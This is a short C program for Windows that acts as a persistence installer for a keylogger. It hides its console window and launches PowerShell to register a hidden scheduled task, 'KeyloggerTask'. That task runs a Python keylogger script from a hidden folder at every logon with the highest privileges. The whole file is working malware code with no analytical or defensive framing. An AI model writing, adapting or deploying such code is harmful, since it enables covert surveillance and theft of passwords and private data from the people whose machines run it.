#include <windows.h>

int main() {
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    ShellExecute(NULL, "open", "powershell.exe", 
                 "-Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-command pyw \"C:\\skriveni_folder\\Keylogger.pyw\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"", 
                 NULL, SW_HIDE);
    return 0;
}
